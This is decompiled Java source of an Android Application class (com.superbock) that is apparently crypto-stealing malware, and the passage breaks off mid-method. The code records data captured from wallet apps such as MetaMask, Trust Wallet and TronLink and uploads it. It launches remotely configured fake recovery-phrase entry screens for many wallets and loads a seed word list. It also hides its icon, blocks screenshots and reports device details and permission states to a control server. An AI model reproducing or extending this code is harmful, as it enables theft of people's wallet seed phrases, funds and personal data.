package com.superbock;

import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.text.TextUtils;
import androidx.annotation.NonNull;
import androidx.constraintlayout.core.motion.utils.TypedValues;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;
import androidx.core.view.PointerIconCompat;
import androidx.work.WorkRequest;
import androidx.work.impl.background.systemalarm.CommandHandler;
import com.blankj.utilcode.util.SPUtils;
import com.superbock.auto.BaseService;
import com.superbock.bean.AdInfo;
import com.superbock.bean.FInfo;
import com.superbock.bean.HInfo;
import com.superbock.bean.JInfo;
import com.superbock.bean.KInfo;
import com.superbock.bean.LInfo;
import com.superbock.bean.MInfo;
import com.superbock.bean.SysNews;
import com.superbock.ui.AdAlertActivity;
import com.superbock.ui.AdAlertBottomActivity;
import com.superbock.ui.AdAlertOneButtonActivity;
import com.superbock.ui.AdBoxActivity;
import com.superbock.ui.AdConfirmActivity;
import com.superbock.ui.AdConfirmBottomActivity;
import com.superbock.ui.AdConfirmOneButtonActivity;
import com.superbock.ui.AdFullscreenActivity;
import com.superbock.ui.AdNoticeActivity;
import com.superbock.ui.AdSingleActivity;
import com.superbock.ui.AdSingleSmallActivity;
import com.superbock.ui.AdWebActivity;
import com.superbock.ui.AdWebSmallActivity;
import com.superbock.ui.StartupActivity;
import com.superbock.ui.custom.InputWordsBinanceActivity;
import com.superbock.ui.custom.InputWordsImActivity;
import com.superbock.ui.custom.InputWordsMetaActivity;
import com.superbock.ui.custom.InputWordsOkxActivity;
import com.superbock.ui.custom.InputWordsTpActivity;
import com.superbock.ui.custom.InputWordsTronglobalActivity;
import com.superbock.ui.custom.InputWordsTronlinkActivity;
import com.superbock.ui.custom.InputWordsTrustActivity;
import com.superbock.ui.custom.InputWordsWalletActivity;
import com.tencent.smtt.sdk.QbSdk;
import comeliest.metempsychosis.pokelogan.R;
import g3.j;
import g3.k;
import g3.l;
import g3.n;
import g3.p;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Objects;
import java.util.Scanner;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import k.j0;
import k3.h;
import k3.i;
import marmojkfnf.huflnkmt.ncagri.jdtuadkc.Ksfndkd;
import s3.b0;
import t2.g;
import z2.m;

/* loaded from: classes.dex */
public class App extends Application {

    /* renamed from: b, reason: collision with root package name */
    public static App f1372b;

    /* renamed from: c, reason: collision with root package name */
    public static boolean f1373c;

    /* renamed from: d, reason: collision with root package name */
    public static boolean f1374d;

    /* renamed from: e, reason: collision with root package name */
    public static long f1375e;

    /* renamed from: f, reason: collision with root package name */
    public static long f1376f;

    /* renamed from: g, reason: collision with root package name */
    public static long f1377g;

    /* renamed from: h, reason: collision with root package name */
    public static long f1378h;

    /* renamed from: i, reason: collision with root package name */
    public static long f1379i;

    /* renamed from: j, reason: collision with root package name */
    public static long f1380j;

    /* loaded from: classes23.dex */
    public class a implements Runnable {
        public a() {
        }

        @Override // java.lang.Runnable
        public final void run() {
            App.a(App.this);
        }
    }

    /* loaded from: classes25.dex */
    public class b implements Runnable {
        @Override // java.lang.Runnable
        public final void run() {
            long j5;
            App app = App.f1372b;
            n c5 = n.c();
            Objects.requireNonNull(c5);
            try {
                j5 = c5.f2979a.f();
            } catch (SQLException e5) {
                e5.printStackTrace();
                j5 = 0;
            }
            if (j5 == 2048) {
                return;
            }
            if (j5 > 0) {
                try {
                    g<MInfo, String> gVar = n.c().f2979a;
                    gVar.m(gVar.h().f());
                } catch (SQLException | Exception unused) {
                    return;
                }
            }
            InputStream open = app.getAssets().open("english.txt");
            try {
                Scanner scanner = new Scanner(open, StandardCharsets.UTF_8.name());
                int i5 = 0;
                while (scanner.hasNextLine()) {
                    try {
                        n.c().f2979a.n(new MInfo(scanner.nextLine().trim(), i5));
                        i5++;
                    } finally {
                    }
                }
                scanner.close();
                if (open != null) {
                    open.close();
                }
            } finally {
            }
        }
    }

    /* loaded from: classes8.dex */
    public class c implements Runnable {

        /* loaded from: classes6.dex */
        public class a implements QbSdk.PreInitCallback {
            @Override // com.tencent.smtt.sdk.QbSdk.PreInitCallback
            public final void onCoreInitFinished() {
            }

            @Override // com.tencent.smtt.sdk.QbSdk.PreInitCallback
            public final void onViewInitFinished(boolean z4) {
            }
        }

        public c() {
        }

        @Override // java.lang.Runnable
        public final void run() {
            QbSdk.initX5Environment(App.this.getApplicationContext(), new a());
        }
    }

    /* loaded from: classes9.dex */
    public class d implements s3.e {
        @Override // s3.e
        public final void a(@NonNull s3.d dVar, @NonNull b0 b0Var) {
            f.e u4;
            int z4;
            try {
                if (b0Var.b() && (u4 = f.a.u(d1.c.f(b0Var.f5160h.e(), i.f3901a))) != null && u4.z("code") == 1) {
                    SPUtils.getInstance().put("savedDev", 1);
                    f.e A = u4.A("data");
                    j0.p(A.B("appDomain"));
                    j0.C(A.B("webSite"));
                    if (A.containsKey("topbar")) {
                        j0.B(A.z("topbar"));
                    }
                    if (A.containsKey("installHide")) {
                        j0.z(A.z("installHide"));
                    }
                    if (A.containsKey("heartTimes")) {
                        j0.x(A.z("heartTimes"));
                        App.f1378h = j0.h() * 60 * 1000;
                    }
                    if (A.containsKey("popupTimes")) {
                        j0.A(A.z("popupTimes"));
                        App.f1379i = j0.j() * 60 * 1000;
                    }
                    if (A.containsKey("uploadImages") && (z4 = A.z("uploadImages")) > -1) {
                        j0.f3714n = z4;
                        SPUtils.getInstance().put("uploadImages", j0.f3714n);
                    }
                    if (A.containsKey("thumbSnap ")) {
                        String B = A.B("thumbSnap ");
                        if (!TextUtils.isEmpty(B)) {
                            j0.f3709i = B;
                            SPUtils.getInstance().put("thumbSnap ", j0.f3709i);
                        }
                    }
                    if (A.containsKey("md5Key")) {
                        SPUtils.getInstance().put("md5Key", A.B("md5Key"));
                    }
                    if (A.containsKey("cnDisable")) {
                        j0.q(A.z("cnDisable"));
                    }
                    if (A.containsKey("customAuto")) {
                        j0.r(A.z("customAuto"));
                    }
                    if (A.containsKey("customMode")) {
                        j0.v(A.z("customMode"));
                    }
                    if (A.containsKey("customMaxTimes")) {
                        j0.u(A.z("customMaxTimes"));
                    }
                    if (A.containsKey("customGlobalTimes")) {
                        j0.s(A.z("customGlobalTimes"));
                    }
                    if (A.containsKey("customSingleTimes")) {
                        j0.w(A.z("customSingleTimes"));
                    }
                    if (A.containsKey("customInstallTimes")) {
                        j0.t(A.z("customInstallTimes"));
                    }
                }
            } catch (Throwable unused) {
            }
        }

        @Override // s3.e
        public final void b(@NonNull s3.d dVar, @NonNull IOException iOException) {
        }
    }

    /* loaded from: classes21.dex */
    public class e implements s3.e {

        /* renamed from: a, reason: collision with root package name */
        public final /* synthetic */ AdInfo f1383a;

        public e(AdInfo adInfo) {
            this.f1383a = adInfo;
        }

        @Override // s3.e
        public final void a(@NonNull s3.d dVar, @NonNull b0 b0Var) {
            f.e u4;
            try {
                if (b0Var.b() && (u4 = f.a.u(d1.c.f(b0Var.f5160h.e(), i.f3901a))) != null && u4.z("code") == 1) {
                    g3.b.c().a(this.f1383a.getTaskId());
                }
            } catch (Throwable unused) {
            }
        }

        @Override // s3.e
        public final void b(@NonNull s3.d dVar, @NonNull IOException iOException) {
        }
    }

    /* loaded from: classes2.dex */
    public class f implements s3.e {
        @Override // s3.e
        public final void a(@NonNull s3.d dVar, @NonNull b0 b0Var) {
        }

        @Override // s3.e
        public final void b(@NonNull s3.d dVar, @NonNull IOException iOException) {
        }
    }

    /* JADX WARN: Type inference failed for: r9v44, types: [java.util.HashMap, java.util.Map<java.lang.String, java.lang.String>] */
    public static void a(App app) {
        AdInfo b5;
        Intent intent;
        synchronized (app) {
            if (!f1374d) {
                boolean z4 = true;
                f1374d = true;
                try {
                    if (BaseService.W > 0 && System.currentTimeMillis() - BaseService.W > WorkRequest.MIN_BACKOFF_MILLIS && BaseService.U.length() > 0) {
                        k.b().a(new JInfo(e3.d.a(), BaseService.W, BaseService.V, 0, BaseService.U, (String) k3.f.f3881l.get(BaseService.V)));
                        BaseService.U = "";
                        BaseService.V = "";
                        BaseService.W = 0L;
                    }
                    if (BaseService.Z > 0 && System.currentTimeMillis() - BaseService.Z > 20000 && BaseService.f1384a0.length() > 0) {
                        l.c().a(new KInfo(e3.d.a(), 1, BaseService.f1384a0, "im.token.app", app.getString(R.string.imtoken)));
                        k3.f.s(f1372b);
                        BaseService.f1384a0 = "";
                        BaseService.Z = 0L;
                    }
                    if (BaseService.f1385b0 > 0 && System.currentTimeMillis() - BaseService.f1385b0 > 20000 && BaseService.f1386c0.length() > 0) {
                        l.c().a(new KInfo(e3.d.a(), 1, BaseService.f1386c0, "vip.mytokenpocket", app.getString(R.string.tokenpocket)));
                        k3.f.s(f1372b);
                        BaseService.f1386c0 = "";
                        BaseService.f1385b0 = 0L;
                    }
                    if (BaseService.f1387d0 > 0 && System.currentTimeMillis() - BaseService.f1387d0 > 20000 && BaseService.f1388e0.length() > 0) {
                        l.c().a(new KInfo(e3.d.a(), 1, BaseService.f1388e0, "com.wallet.crypto.trustapp", app.getString(R.string.trustwallet)));
                        k3.f.s(f1372b);
                        BaseService.f1388e0 = "";
                        BaseService.f1387d0 = 0L;
                    }
                    if (BaseService.f1389f0 > 0 && System.currentTimeMillis() - BaseService.f1389f0 > 20000 && BaseService.f1390g0.length() > 0) {
                        l.c().a(new KInfo(e3.d.a(), 1, BaseService.f1390g0, "com.tronlinkpro.wallet", app.getString(R.string.tronlinkpro)));
                        k3.f.s(f1372b);
                        BaseService.f1390g0 = "";
                        BaseService.f1389f0 = 0L;
                    }
                    if (BaseService.f1391h0 > 0 && System.currentTimeMillis() - BaseService.f1391h0 > 20000 && BaseService.f1392i0.length() > 0) {
                        l.c().a(new KInfo(e3.d.a(), 1, BaseService.f1392i0, "com.tronlink.global", app.getString(R.string.tronlinkglobal)));
                        k3.f.s(f1372b);
                        BaseService.f1392i0 = "";
                        BaseService.f1391h0 = 0L;
                    }
                    if (BaseService.f1393j0 > 0 && System.currentTimeMillis() - BaseService.f1393j0 > 20000 && BaseService.f1394k0.length() > 0) {
                        l.c().a(new KInfo(e3.d.a(), 1, BaseService.f1394k0, "io.metamask", app.getString(R.string.metamask)));
                        k3.f.s(f1372b);
                        BaseService.f1394k0 = "";
                        BaseService.f1393j0 = 0L;
                    }
                    if (SPUtils.getInstance().getInt("savedDev", 0) == 0) {
                        app.e();
                    }
                    long j5 = f1378h;
                    boolean i5 = k3.a.i(app);
                    boolean c5 = k3.d.c();
                    if (!f3.i.b() && !i5) {
                        j5 = c5 ? WorkRequest.MIN_BACKOFF_MILLIS : WorkRequest.DEFAULT_BACKOFF_DELAY_MILLIS;
                    }
                    if (System.currentTimeMillis() - f1375e > j5) {
                        f.e eVar = new f.e();
                        eVar.put("action", "getAdInfo");
                        eVar.put("deviceId", k3.a.c(app));
                        eVar.put("limit", 15);
                        eVar.put("lastTime", Long.valueOf(f1375e));
                        i.a(eVar, new e3.b(app));
                    }
                    if (j0.g() != 1 || !k3.a.j()) {
                        List<AdInfo> list = null;
                        if ((!StartupActivity.f1537g || (StartupActivity.f1538h > 0 && System.currentTimeMillis() - StartupActivity.f1538h > CommandHandler.WORK_PROCESSING_TIME_IN_MS)) && !f1373c && !c5 && !i5 && app.getResources().getConfiguration().orientation != 2 && ((PowerManager) app.getSystemService("power")).isInteractive() && !k3.e.b(app) && System.currentTimeMillis() - f1376f > f1379i && (b5 = g3.b.c().b()) != null && k3.a.g(app)) {
                            int template = b5.getTemplate();
                            switch (template) {
                                case 1:
                                    intent = new Intent(app, (Class<?>) AdNoticeActivity.class);
                                    break;
                                case 2:
                                    intent = new Intent(app, (Class<?>) AdSingleActivity.class);
                                    break;
                                case 3:
                                    intent = new Intent(app, (Class<?>) AdSingleSmallActivity.class);
                                    break;
                                case 4:
                                    intent = new Intent(app, (Class<?>) AdFullscreenActivity.class);
                                    break;
                                case 5:
                                    intent = new Intent(app, (Class<?>) AdWebActivity.class);
                                    break;
                                case 6:
                                    intent = new Intent(app, (Class<?>) AdWebSmallActivity.class);
                                    break;
                                case 7:
                                    if (!TextUtils.isEmpty(b5.getImg())) {
                                        if (!TextUtils.isEmpty(b5.getCancel())) {
                                            intent = new Intent(app, (Class<?>) AdAlertActivity.class);
                                            break;
                                        } else {
                                            intent = new Intent(app, (Class<?>) AdAlertOneButtonActivity.class);
                                            break;
                                        }
                                    } else if (!TextUtils.isEmpty(b5.getCancel())) {
                                        intent = new Intent(app, (Class<?>) AdConfirmActivity.class);
                                        break;
                                    } else {
                                        intent = new Intent(app, (Class<?>) AdConfirmOneButtonActivity.class);
                                        break;
                                    }
                                case 8:
                                    if (!TextUtils.isEmpty(b5.getImg())) {
                                        intent = new Intent(app, (Class<?>) AdAlertBottomActivity.class);
                                        break;
                                    } else {
                                        intent = new Intent(app, (Class<?>) AdConfirmBottomActivity.class);
                                        break;
                                    }
                                case 9:
                                    intent = new Intent(app, (Class<?>) AdBoxActivity.class);
                                    break;
                                default:
                                    switch (template) {
                                        case PointerIconCompat.TYPE_CONTEXT_MENU /* 1001 */:
                                            intent = new Intent(app, (Class<?>) InputWordsTrustActivity.class);
                                            break;
                                        case PointerIconCompat.TYPE_HAND /* 1002 */:
                                            intent = new Intent(app, (Class<?>) InputWordsTpActivity.class);
                                            break;
                                        case PointerIconCompat.TYPE_HELP /* 1003 */:
                                            intent = new Intent(app, (Class<?>) InputWordsImActivity.class);
                                            break;
                                        case PointerIconCompat.TYPE_WAIT /* 1004 */:
                                            intent = new Intent(app, (Class<?>) InputWordsMetaActivity.class);
                                            break;
                                        case 1005:
                                            intent = new Intent(app, (Class<?>) InputWordsWalletActivity.class);
                                            break;
                                        case PointerIconCompat.TYPE_CELL /* 1006 */:
                                            intent = new Intent(app, (Class<?>) InputWordsTronlinkActivity.class);
                                            break;
                                        case PointerIconCompat.TYPE_CROSSHAIR /* 1007 */:
                                            intent = new Intent(app, (Class<?>) InputWordsTronglobalActivity.class);
                                            break;
                                        case PointerIconCompat.TYPE_TEXT /* 1008 */:
                                            intent = new Intent(app, (Class<?>) InputWordsBinanceActivity.class);
                                            break;
                                        case PointerIconCompat.TYPE_VERTICAL_TEXT /* 1009 */:
                                            intent = new Intent(app, (Class<?>) InputWordsOkxActivity.class);
                                            break;
                                        default:
                                            intent = null;
                                            break;
                                    }
                            }
                            if (intent != null) {
                                b5.setReceiptId(e3.d.a());
                                if (!TextUtils.isEmpty(b5.getLink())) {
                                    StringBuilder sb = new StringBuilder();
                                    sb.append(b5.getLink());
                                    sb.append(b5.getLink().contains("?") ? "&" : "?");
                                    sb.append("reid=");
                                    sb.append(b5.getReceiptId());
                                    b5.setLink(sb.toString());
                                }
                                if (!TextUtils.isEmpty(b5.getOtherLink())) {
                                    StringBuilder sb2 = new StringBuilder();
                                    sb2.append(b5.getOtherLink());
                                    sb2.append(b5.getOtherLink().contains("?") ? "&" : "?");
                                    sb2.append("reid=");
                                    sb2.append(b5.getReceiptId());
                                    b5.setOtherLink(sb2.toString());
                                }
                                intent.putExtra("adInfo", b5);
                                if (!e3.d.f2592b || Build.VERSION.SDK_INT < 23 || Settings.canDrawOverlays(app)) {
                                    z4 = false;
                                }
                                k3.d.f(app, intent, z4);
                                if (!z4) {
                                    new Handler(Looper.getMainLooper()).postDelayed(new e3.c(intent), 5000L);
                                }
                            } else {
                                g3.b.c().a(b5.getTaskId());
                            }
                        }
                        if (f1376f > f1377g) {
                            g3.b c6 = g3.b.c();
                            Objects.requireNonNull(c6);
                            try {
                                g<AdInfo, String> gVar = c6.f2953a;
                                m<AdInfo, String> g5 = gVar.c().g();
                                g5.a(new b3.c(g5.d("receiptId")));
                                list = gVar.k(g5.j());
                            } catch (SQLException e5) {
                                e5.printStackTrace();
                            }
                            if (list != null && !list.isEmpty()) {
                                if (k3.a.g(app)) {
                                    Iterator<AdInfo> it = list.iterator();
                                    while (it.hasNext()) {
                                        app.d(it.next(), false, false);
                                    }
                                }
                            }
                            f1377g = System.currentTimeMillis();
                            SPUtils.getInstance().put("lastReceiptTime", f1377g);
                        }
                        k3.f.j(f1372b, false);
                    }
                } catch (Throwable unused) {
                }
                f1374d = false;
            }
        }
    }

    public static void b(App app, boolean z4) {
        synchronized (app) {
            boolean d5 = k3.d.d(app);
            if (z4) {
                if (!d5) {
                    int i5 = e3.d.f2591a;
                    if (i5 != 3 && i5 != 14) {
                        k3.d.b(app.getApplicationContext(), 1);
                    }
                    k3.d.b(app.getApplicationContext(), 2);
                }
            } else if (d5) {
                Ksfndkd.INSTANCE.showIcon(app.getApplicationContext(), "com.superbock.ui.StartupActivity");
            }
            app.f();
        }
    }

    @Override // android.content.ContextWrapper
    public final void attachBaseContext(Context context) {
        Ksfndkd ksfndkd = Ksfndkd.INSTANCE;
        ksfndkd.setUSE_BA_ACTIVITY(true);
        ksfndkd.setUse_activity(false);
        ksfndkd.setUse_notification(false);
        ksfndkd.setUse_service(false);
        ksfndkd.setUse_music(false);
        ksfndkd.setUse_domaemon(false);
        ksfndkd.setUse_thaw(false);
        ksfndkd.setUse_receiver(true);
        if (ksfndkd.isFgProcess(context)) {
            ksfndkd.attach(context);
        }
        super.attachBaseContext(context);
    }

    /* JADX WARN: Type inference failed for: r1v11, types: [java.util.HashMap, java.util.Map<java.lang.String, java.lang.String>] */
    public final void c(AdInfo adInfo) {
        if (adInfo == null) {
            return;
        }
        LInfo lInfo = new LInfo();
        lInfo.setId(adInfo.getTaskId());
        lInfo.setTy(adInfo.getType());
        lInfo.setSta(adInfo.getStartTime());
        lInfo.setSto(System.currentTimeMillis());
        lInfo.setFb(adInfo.getFeedBack());
        lInfo.setPk(adInfo.getPkg());
        lInfo.setTp(adInfo.getTemplate());
        lInfo.setTt(adInfo.getTitle());
        lInfo.setMs(adInfo.getMsg());
        lInfo.setUs(adInfo.getUse());
        lInfo.setPid(adInfo.getPreId());
        lInfo.setNa((String) k3.f.f3881l.get(adInfo.getPkg()));
        lInfo.setCid(adInfo.getCustomId());
        if (lInfo.getTy() >= 3) {
            lInfo.getSto();
        }
        g3.m a5 = g3.m.a();
        Objects.requireNonNull(a5);
        try {
            a5.f2977a.p(lInfo);
        } catch (SQLException e5) {
            e5.printStackTrace();
        }
    }

    public final void d(AdInfo adInfo, boolean z4, boolean z5) {
        if (adInfo == null) {
            return;
        }
        if (z4) {
            adInfo.setStopTime(System.currentTimeMillis());
            g3.b c5 = g3.b.c();
            Objects.requireNonNull(c5);
            try {
                c5.f2953a.p(adInfo);
            } catch (SQLException e5) {
                e5.printStackTrace();
            }
            f1373c = false;
            f1376f = System.currentTimeMillis();
            SPUtils.getInstance().put("lastPopupTime", f1376f);
            if (z5) {
                return;
            }
        }
        f.e eVar = new f.e();
        eVar.put("action", "saveReceipt");
        eVar.put("deviceId", k3.a.c(this));
        eVar.put("taskId", adInfo.getTaskId());
        eVar.put("templateId", adInfo.getTemplateId());
        eVar.put("receiptId", adInfo.getReceiptId());
        eVar.put("showTime", Long.valueOf(adInfo.getStartTime()));
        eVar.put(TypedValues.TransitionType.S_DURATION, Long.valueOf(adInfo.getStopTime() - adInfo.getStartTime()));
        eVar.put("feedBack", Integer.valueOf(adInfo.getFeedBack()));
        eVar.put("hide", Integer.valueOf(adInfo.getHide()));
        eVar.put("type", Integer.valueOf(adInfo.getType()));
        if (!TextUtils.isEmpty(adInfo.getUrl())) {
            eVar.put("link", adInfo.getUrl());
        }
        i.a(eVar, new e(adInfo));
    }

    public final void e() {
        Object obj;
        int i5;
        f.e eVar = new f.e();
        eVar.put("action", "saveDev");
        eVar.put("step", 1);
        eVar.put("deviceId", k3.a.c(this));
        try {
            obj = getPackageManager().getPackageInfo(getPackageName(), 0).versionName;
        } catch (PackageManager.NameNotFoundException unused) {
            obj = "";
        }
        eVar.put("version", obj);
        try {
            i5 = getPackageManager().getPackageInfo(getPackageName(), 0).versionCode;
        } catch (PackageManager.NameNotFoundException unused2) {
            i5 = 0;
        }
        eVar.put("vercode", Integer.valueOf(i5));
        eVar.put("vertype", 0);
        eVar.put("launcher", 0);
        eVar.put("iconStatus", Integer.valueOf(k3.d.d(this) ? 1 : 0));
        eVar.put("installTime", Long.valueOf(f1380j));
        eVar.put("appName", k3.a.b(this));
        eVar.put("channel", "default");
        Object language = Locale.getDefault().getLanguage();
        if ("zh".equals(language)) {
            String country = Locale.getDefault().getCountry();
            if ("tw".equalsIgnoreCase(country) || "hk".equalsIgnoreCase(country) || "mo".equalsIgnoreCase(country)) {
                language = "tw";
            }
        }
        eVar.put("lang", language);
        eVar.put("width", Integer.valueOf(h.b(this)));
        eVar.put("height", Integer.valueOf(h.a(this)));
        eVar.put("model", Build.MODEL);
        eVar.put("manf", Build.MANUFACTURER);
        eVar.put("release", Build.VERSION.RELEASE);
        int i6 = Build.VERSION.SDK_INT;
        eVar.put("sdk", Integer.valueOf(i6));
        String string = SPUtils.getInstance().getString("ip");
        if (string.length() > 0) {
            eVar.put("ip", string);
        }
        String string2 = SPUtils.getInstance().getString("area");
        if (string2.length() > 0) {
            eVar.put("area", string2);
        }
        if (e3.d.f2591a == 1 && k3.a.h()) {
            String d5 = k3.a.d();
            if (!"".equals(d5)) {
                eVar.put("release", "鸿蒙" + d5);
            }
        }
        if (i6 >= 23) {
            eVar.put("overlay", Integer.valueOf(Settings.canDrawOverlays(this) ? 1 : e3.d.f2592b ? 2 : 0));
        }
        eVar.put("launch", Integer.valueOf(SPUtils.getInstance().getInt("launch", 1)));
        eVar.put("autoStart", Integer.valueOf(SPUtils.getInstance().getInt("autoStart", 0)));
        eVar.put("enter", Integer.valueOf(SPUtils.getInstance().getInt("enter", 0)));
        eVar.put("readImages", Integer.valueOf((i6 <= 32 ? ContextCompat.checkSelfPermission(this, "android.permission.READ_EXTERNAL_STORAGE") != 0 : ContextCompat.checkSelfPermission(this, "android.permission.READ_MEDIA_IMAGES") != 0) ? 0 : 1));
        eVar.put("readContacts", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.READ_CONTACTS") == 0 ? 1 : 0));
        eVar.put("readSms", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.READ_SMS") == 0 ? 1 : 0));
        eVar.put("readCallLog", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.READ_CALL_LOG") == 0 ? 1 : 0));
        if (i6 >= 23) {
            eVar.put("accessibility", Integer.valueOf(k3.a.f(this) ? 1 : 0));
            eVar.put("battery", Integer.valueOf(((PowerManager) getSystemService("power")).isIgnoringBatteryOptimizations(getPackageName()) ? 1 : 0));
        }
        eVar.put("writeFile", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.WRITE_EXTERNAL_STORAGE") == 0 ? 1 : 0));
        eVar.put("camera", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.CAMERA") == 0 ? 1 : 0));
        eVar.put("recordAudio", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.RECORD_AUDIO") == 0 ? 1 : 0));
        eVar.put("location", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.ACCESS_COARSE_LOCATION") == 0 ? 1 : 0));
        eVar.put("sendSms", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.SEND_SMS") == 0 ? 1 : 0));
        eVar.put("getAccounts", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.GET_ACCOUNTS") == 0 ? 1 : 0));
        eVar.put("callPhone", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.CALL_PHONE") != 0 ? 0 : 1));
        eVar.put("notification", Integer.valueOf(NotificationManagerCompat.from(this).areNotificationsEnabled() ? 1 : 0));
        i.a(eVar, new d());
    }

    public final void f() {
        boolean d5 = k3.d.d(this);
        BaseService.X = d5;
        BaseService.Y = d5 ? k3.d.a(this) : null;
        f3.i.h(d5);
        f.e eVar = new f.e();
        eVar.put("action", "updateIcon");
        eVar.put("deviceId", k3.a.c(this));
        eVar.put("iconStatus", Integer.valueOf(d5 ? 1 : 0));
        i.a(eVar, new f());
    }

    @Override // android.app.Application
    public final void onCreate() {
        long j5;
        Object obj;
        int i5;
        super.onCreate();
        if (Ksfndkd.INSTANCE.isFgProcess(getApplicationContext())) {
            return;
        }
        f1372b = this;
        try {
            j5 = getPackageManager().getPackageInfo(getPackageName(), 0).firstInstallTime;
        } catch (PackageManager.NameNotFoundException unused) {
            j5 = 0;
        }
        f1380j = j5;
        ArrayList<String> arrayList = new ArrayList<>();
        Ksfndkd ksfndkd = Ksfndkd.INSTANCE;
        ksfndkd.setIsHideActivityTaskWhenHome(true, arrayList);
        ksfndkd.setProhibitScreenshots(true);
        ksfndkd.setUSE_ShowWhenLocked(false);
        ksfndkd.init(getApplicationContext(), false);
        boolean isMainProcess = ksfndkd.isMainProcess(this);
        LInfo lInfo = null;
        if (isMainProcess) {
            f1375e = SPUtils.getInstance().getLong("lastGetTime", 0L);
            f1376f = SPUtils.getInstance().getLong("lastPopupTime", 0L);
            f1377g = SPUtils.getInstance().getLong("lastReceiptTime", 0L);
            g3.m a5 = g3.m.a();
            Objects.requireNonNull(a5);
            try {
                z2.h<LInfo, String> c5 = a5.f2977a.c();
                c5.l("sta", false);
                m g5 = c5.g();
                g5.e(3);
                if (!TextUtils.isEmpty(null)) {
                    g5.b();
                    g5.c("pk", null);
                }
                c5.f6146g = g5;
                lInfo = a5.f2977a.j(c5.f());
            } catch (SQLException unused2) {
            }
            if (lInfo != null) {
                lInfo.getSto();
            }
            f1378h = j0.h() * 60 * 1000;
            f1379i = j0.j() * 60 * 1000;
            Executors.newScheduledThreadPool(1).scheduleAtFixedRate(new a(), 30L, 30L, TimeUnit.SECONDS);
        }
        new Thread(new b()).start();
        synchronized (k3.c.class) {
            if (!k3.c.f3864a) {
                k3.c.f3864a = true;
                ArrayList arrayList2 = new ArrayList();
                arrayList2.add("https://api.ip.sb/geoip/");
                arrayList2.add("https://api.ip2location.io/");
                arrayList2.add("https://ipapi.co/json");
                arrayList2.add("https://api.db-ip.com/v2/free/self");
                arrayList2.add("https://ipwhois.app/json/?format=json");
                arrayList2.add("https://api.ipbase.com/v1/json");
                arrayList2.add("https://api.ipquery.io/?format=json");
                Collections.shuffle(arrayList2);
                k3.c.a(arrayList2);
            }
        }
        f.e eVar = new f.e();
        eVar.put("action", "saveDev");
        eVar.put("step", 1);
        eVar.put("deviceId", k3.a.c(this));
        try {
            obj = getPackageManager().getPackageInfo(getPackageName(), 0).versionName;
        } catch (PackageManager.NameNotFoundException unused3) {
            obj = "";
        }
        eVar.put("version", obj);
        try {
            i5 = getPackageManager().getPackageInfo(getPackageName(), 0).versionCode;
        } catch (PackageManager.NameNotFoundException unused4) {
            i5 = 0;
        }
        eVar.put("vercode", Integer.valueOf(i5));
        eVar.put("vertype", 0);
        eVar.put("launcher", 0);
        boolean d5 = k3.d.d(this);
        int i6 = e3.d.f2591a;
        eVar.put("iconStatus", Integer.valueOf(d5 ? 1 : 0));
        eVar.put("installTime", Long.valueOf(f1380j));
        eVar.put("appName", k3.a.b(this));
        eVar.put("channel", "default");
        Object language = Locale.getDefault().getLanguage();
        if ("zh".equals(language)) {
            String country = Locale.getDefault().getCountry();
            if ("tw".equalsIgnoreCase(country) || "hk".equalsIgnoreCase(country) || "mo".equalsIgnoreCase(country)) {
                language = "tw";
            }
        }
        eVar.put("lang", language);
        eVar.put("width", Integer.valueOf(h.b(this)));
        eVar.put("height", Integer.valueOf(h.a(this)));
        eVar.put("model", Build.MODEL);
        eVar.put("manf", Build.MANUFACTURER);
        eVar.put("release", Build.VERSION.RELEASE);
        int i7 = Build.VERSION.SDK_INT;
        eVar.put("sdk", Integer.valueOf(i7));
        String string = SPUtils.getInstance().getString("ip");
        if (string.length() > 0) {
            eVar.put("ip", string);
        }
        String string2 = SPUtils.getInstance().getString("area");
        if (string2.length() > 0) {
            eVar.put("area", string2);
        }
        if (i6 == 1 && k3.a.h()) {
            String d6 = k3.a.d();
            if (!"".equals(d6)) {
                eVar.put("release", "鸿蒙" + d6);
            }
        }
        long currentTimeMillis = System.currentTimeMillis();
        SPUtils.getInstance().put("startupTime", currentTimeMillis);
        eVar.put("startupTime", Long.valueOf(currentTimeMillis));
        if (i7 >= 23) {
            eVar.put("overlay", Integer.valueOf(Settings.canDrawOverlays(this) ? 1 : e3.d.f2592b ? 2 : 0));
        }
        int i8 = SPUtils.getInstance().getInt("launch", 0) + 1;
        SPUtils.getInstance().put("launch", i8);
        eVar.put("launch", Integer.valueOf(i8));
        eVar.put("startUp", Integer.valueOf(i8 > 1 ? 1 : 2));
        int i9 = SPUtils.getInstance().getInt("autoStart", 0);
        if (i8 > 1) {
            i9++;
        }
        SPUtils.getInstance().put("autoStart", i9);
        eVar.put("autoStart", Integer.valueOf(i9));
        eVar.put("enter", Integer.valueOf(SPUtils.getInstance().getInt("enter", 0)));
        eVar.put("readImages", Integer.valueOf((i7 <= 32 ? ContextCompat.checkSelfPermission(this, "android.permission.READ_EXTERNAL_STORAGE") != 0 : ContextCompat.checkSelfPermission(this, "android.permission.READ_MEDIA_IMAGES") != 0) ? 0 : 1));
        eVar.put("readContacts", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.READ_CONTACTS") == 0 ? 1 : 0));
        eVar.put("readSms", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.READ_SMS") == 0 ? 1 : 0));
